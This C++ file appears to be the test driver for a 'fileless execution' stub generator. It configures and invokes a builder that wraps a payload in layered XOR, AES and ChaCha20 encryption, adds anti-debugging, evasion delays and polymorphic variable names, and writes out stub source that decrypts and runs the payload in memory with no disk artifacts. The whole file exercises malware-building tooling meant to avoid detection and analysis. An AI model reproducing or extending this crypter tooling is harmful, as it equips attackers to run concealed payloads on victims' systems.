#include "fileless_execution_generator.h"
#include <iostream>
#include <fstream>

int main() {
    std::cout << "=== Fileless Execution Generator Test ===\n";
    std::cout << "Testing advanced fileless execution with multi-layer encryption\n\n";
    
    FilelessExecutionGenerator generator;
    FilelessExecutionGenerator::FilelessConfig config;
    
    // Configure all advanced features
    config.antiDebug = true;
    config.randomDelays = true;
    config.memoryProtection = true;
    config.instructionCacheFlush = true;
    config.crossPlatform = true;
    config.multiLayerEncryption = true;
    config.polymorphicVariables = true;
    config.xorKeySize = 17;
    config.aesKeySize = 32;
    config.chachaKeySize = 16;
    
    std::cout << "Configuration:\n";
    std::cout << "- Anti-Debug: " << (config.antiDebug ? "YES" : "NO") << "\n";
    std::cout << "- Random Delays: " << (config.randomDelays ? "YES" : "NO") << "\n";
    std::cout << "- Memory Protection: " << (config.memoryProtection ? "YES" : "NO") << "\n";
    std::cout << "- Instruction Cache Flush: " << (config.instructionCacheFlush ? "YES" : "NO") << "\n";
    std::cout << "- Cross Platform: " << (config.crossPlatform ? "YES" : "NO") << "\n";
    std::cout << "- Multi-Layer Encryption: " << (config.multiLayerEncryption ? "YES" : "NO") << "\n";
    std::cout << "- Polymorphic Variables: " << (config.polymorphicVariables ? "YES" : "NO") << "\n";
    std::cout << "- XOR Key Size: " << config.xorKeySize << " bytes\n";
    std::cout << "- AES Key Size: " << config.aesKeySize << " bytes\n";
    std::cout << "- ChaCha20 Key Size: " << config.chachaKeySize << " bytes\n\n";
    
    try {
        // Generate test payload
        auto testPayload = generator.generateTestPayload();
        std::cout << "Generated test payload: " << testPayload.size() << " bytes\n";
        
        // Generate fileless stub
        std::string stubCode = generator.generateFilelessStub(testPayload, config);
        
        // Get generated variable names
        auto variables = generator.getVariables();
        
        std::cout << "\nGenerated variable names:\n";
        std::cout << "- Anti-Debug Function: " << variables.antiDebugFunc << "\n";
        std::cout << "- Payload Array: " << variables.payloadArray << "\n";
        std::cout << "- XOR Key Array: " << variables.xorKeyArray << "\n";
        std::cout << "- AES Key Array: " << variables.aesKeyArray << "\n";
        std::cout << "- ChaCha20 Key Array: " << variables.chachaKeyArray << "\n";
        std::cout << "- Memory Pointer: " << variables.memoryPtr << "\n";
        std::cout << "- Memory Size: " << variables.memorySize << "\n";
        std::cout << "- Decrypt Pointer: " << variables.decryptPtr << "\n";
        std::cout << "- Protection Variable: " << variables.protectionVar << "\n\n";
        
        // Save to file
        std::ofstream out("fileless_execution_stub.cpp");
        if (out) {
            out << stubCode;
            out.close();
            std::cout << "✅ Generated: fileless_execution_stub.cpp\n";
            std::cout << "✅ Size: " << stubCode.size() << " bytes\n";
            
            // Verify variable name validity
            bool allValid = true;
            std::vector<std::string> names = {
                variables.antiDebugFunc, variables.payloadArray,
                variables.xorKeyArray, variables.aesKeyArray,
                variables.chachaKeyArray, variables.memoryPtr,
                variables.memorySize, variables.decryptPtr,
                variables.protectionVar
            };
            
            for (const auto& name : names) {
                if (!name.empty() && !std::isalpha(name[0])) {
                    std::cout << "❌ Invalid variable name: " << name << " (starts with non-letter)\n";
                    allValid = false;
                }
            }
            
            if (allValid) {
                std::cout << "✅ All variable names are valid C++ identifiers\n";
            }
            
            std::cout << "\nFeatures included:\n";
            std::cout << "✅ Cross-platform compatibility (Windows/Linux)\n";
            std::cout << "✅ Anti-debugging with multiple detection methods\n";
            std::cout << "✅ Multi-layer encryption (XOR + AES + ChaCha20)\n";
            std::cout << "✅ Random timing delays for evasion\n";
            std::cout << "✅ In-memory payload decryption\n";
            std::cout << "✅ Memory protection management\n";
            std::cout << "✅ Instruction cache flushing\n";
            std::cout << "✅ Polymorphic variable names\n";
            std::cout << "✅ Fileless execution (no disk artifacts)\n";
            
        } else {
            std::cerr << "❌ Failed to write stub file!\n";
            return 1;
        }
        
        // Generate a simpler version for testing
        std::cout << "\nGenerating simplified version for testing...\n";
        FilelessExecutionGenerator::FilelessConfig simpleConfig;
        simpleConfig.antiDebug = false;
        simpleConfig.randomDelays = false;
        simpleConfig.xorKeySize = 8;
        simpleConfig.aesKeySize = 16;
        simpleConfig.chachaKeySize = 8;
        
        std::string simpleStub = generator.generateFilelessStub(testPayload, simpleConfig);
        
        std::ofstream simpleOut("fileless_execution_simple.cpp");
        if (simpleOut) {
            simpleOut << simpleStub;
            simpleOut.close();
            std::cout << "✅ Generated: fileless_execution_simple.cpp (simplified version)\n";
            std::cout << "✅ Size: " << simpleStub.size() << " bytes\n";
        }
        
    } catch (const std::exception& e) {
        std::cerr << "❌ Error generating fileless stub: " << e.what() << "\n";
        return 1;
    }
    
    return 0;
}